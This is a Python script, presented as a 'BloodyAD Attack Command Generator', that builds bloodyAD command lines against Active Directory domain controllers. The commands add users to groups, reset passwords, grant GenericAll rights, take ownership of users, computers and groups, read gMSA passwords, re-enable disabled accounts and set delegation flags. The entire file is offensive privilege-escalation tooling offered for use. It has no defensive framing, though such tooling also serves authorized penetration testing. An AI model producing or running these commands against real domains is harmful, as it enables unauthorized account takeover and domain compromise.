import sys

def generate_bloodyAD_command(choice, **kwargs):
    if choice == "1":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} get object {kwargs['target_username']}"
    elif choice == "2":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add groupMember {kwargs['group_name']} {kwargs['member_to_add']}"
    elif choice == "3":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_username']} {kwargs['new_password']}"
    elif choice == "4":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['DN']} {kwargs['target_username']}"
    elif choice == "5_user":
        commands = []
        # Step 1: WriteOwner
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_user']} {kwargs['username']}"
        )
        # Step 2: GenericAll
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_user']} {kwargs['username']}"
        )
        # Step 3: Change Password
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_user']} NewStrongPassword123!"
        )
        return "\n".join(commands)
    elif choice == "5_computer":
        commands = []
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_computer']} {kwargs['username']}"
        )
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_computer']} {kwargs['username']}"
        )
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_computer']} NewStrongPassword123!"
        )
        return "\n".join(commands)
    elif choice == "5_group":
        commands = []
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_group']} {kwargs['username']}"
        )
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['target_group']} {kwargs['username']}"
        )
        commands.append(
            f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_group']} NewStrongPassword123!"
        )
        return "\n".join(commands)
    elif choice == "6":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} get object {kwargs['target_username']} --attr msDS-ManagedPassword"
    elif choice == "7":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} remove uac {kwargs['target_username']} -f ACCOUNTDISABLE"
    elif choice == "8":
        return f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add uac {kwargs['target_username']} -f TRUSTED_TO_AUTH_FOR_DELEGATION"
    else:
        return "Invalid choice!"

def main():
    print("=== BloodyAD Attack Command Generator ===")
    print("Choose an attack vector:")
    print("1. Retrieve User Information")
    print("2. Add User To Group")
    print("3. Change Password")
    print("4. Give User GenericAll Rights")
    print("5. WriteOwner")
    print("6. ReadGMSAPassword")
    print("7. Enable a Disabled Account")
    print("8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag")

    choice_input = input("Enter your choice (e.g., 1, 2, 3...): ").strip()

    if choice_input == "5":
        print("\nChoose WriteOwner option:")
        print("1. WriteOwner on User")
        print("2. WriteOwner on Computer")
        print("3. WriteOwner on Groups")
        sub_choice = input("Enter your choice (1, 2, 3): ").strip()

        if sub_choice == "1":
            inputs = {
                "dc": input("Enter dc: "),
                "domain": input("Enter domain: "),
                "username": input("Enter username: "),
                "password": input("Enter password: "),
                "target_user": input("Enter target_user: ")
            }
            command = generate_bloodyAD_command("5_user", **inputs)

        elif sub_choice == "2":
            inputs = {
                "dc": input("Enter dc: "),
                "domain": input("Enter domain: "),
                "username": input("Enter username: "),
                "password": input("Enter password: "),
                "target_computer": input("Enter target_computer: ")
            }
            command = generate_bloodyAD_command("5_computer", **inputs)

        elif sub_choice == "3":
            inputs = {
                "dc": input("Enter dc: "),
                "domain": input("Enter domain: "),
                "username": input("Enter username: "),
                "password": input("Enter password: "),
                "target_group": input("Enter target_group: ")
            }
            command = generate_bloodyAD_command("5_group", **inputs)

        else:
            print("Invalid sub-choice for WriteOwner.")
            sys.exit(1)

        print("\nGenerated Commands:")
        print(command)
        return

    # Normal flow for choices 1-4,6,7,8
    required_inputs = {
        "1": ["dc", "domain", "username", "password", "target_username"],
        "2": ["dc", "domain", "username", "password", "group_name", "member_to_add"],
        "3": ["dc", "domain", "username", "password", "target_username", "new_password"],
        "4": ["dc", "domain", "username", "password", "DN", "target_username"],
        "6": ["dc", "domain", "username", "password", "target_username"],
        "7": ["dc", "domain", "username", "password", "target_username"],
        "8": ["dc", "domain", "username", "password", "target_username"]
    }

    if choice_input not in required_inputs:
        print("Invalid choice. Please restart the program.")
        sys.exit(1)

    inputs = {}
    for field in required_inputs[choice_input]:
        inputs[field] = input(f"Enter {field}: ").strip()

    command = generate_bloodyAD_command(choice_input, **inputs)

    print("\nGenerated Commands:")
    print(command)

if __name__ == "__main__":
    main()
